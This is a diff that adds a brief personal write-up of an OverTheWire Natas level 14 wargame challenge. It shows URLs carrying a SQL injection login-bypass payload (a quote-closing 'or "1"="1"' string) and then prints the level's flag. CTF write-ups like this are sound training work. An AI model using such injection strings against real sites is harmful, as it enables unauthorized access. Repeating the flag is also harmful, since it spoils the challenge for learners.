@@ -1,0 +1,17 @@
+SQLi (had to steal a bit from a walkthrough on the challenge).
+
+If the paramaters are send woth GET (through URL) and not POST I can add a debug parameter and see the quesry being executed.
+
+http://natas14.natas.labs.overthewire.org/?username=natas&password=pass&debug
+
+Then I need to inject SQL
+
+http://natas14.natas.labs.overthewire.org/?username=natas15%22&password=pass&debug
+
+Which gives an error becuase the quotes aren't closed so
+
+http://natas14.natas.labs.overthewire.org/?username=natas15%22or%221%22=%221&password=pass&debug
+
+Flag:
+
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
